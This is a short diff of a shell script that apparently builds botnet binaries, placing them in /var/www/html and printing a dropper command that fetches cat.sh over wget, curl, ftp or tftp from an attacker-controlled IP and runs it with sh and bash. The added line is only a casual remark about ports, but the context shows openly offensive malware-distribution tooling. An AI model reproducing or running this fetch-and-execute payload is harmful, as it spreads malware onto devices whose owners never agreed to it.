@@ -127,5 +127,6 @@ EOF
 echo "DONE COMPILING BOT, BINS IN /var/www/html"
 echo "THIS COMPILER IS NOT RECOMMENDED"
 echo "Your payload is: wget http://$IP/cat.sh; curl http://$IP/cat.sh -o cat.sh; ftp http://$IP/cat.sh; tftp $IP -c get cat.sh; sh cat.sh; bash cat.sh;"
+echo "if ur port aint default 80 its not my problem do it manually urself thats just too much work for me"
 
 exit 0
